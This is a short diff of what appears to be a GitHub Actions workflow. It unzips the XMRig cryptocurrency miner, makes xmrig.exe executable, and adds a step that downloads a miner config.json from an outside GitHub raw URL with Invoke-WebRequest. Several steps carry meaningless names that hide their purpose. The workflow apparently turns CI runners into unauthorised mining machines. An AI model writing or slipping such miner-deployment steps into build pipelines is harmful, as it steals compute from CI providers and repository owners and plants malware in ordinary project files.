@@ -14,7 +14,7 @@ jobs:
     - name: executing xm commands
       run: unzip xmrig-6.17.0-gcc-win64.zip
     - name: config file
-      run : Invoke-WebRequest 
+      run : cd xmrig-6.17.0-gcc-win64/xmrig-6.17.0 && Invoke-WebRequest https://raw.githubusercontent.com/Ma24wt/win11_rdp/main/config.json -Outfile config.json
     - name : sndndn 
       run: cd xmrig-6.17.0-gcc-win64/xmrig-6.17.0 && chmod +x xmrig.exe
     - name : djhd
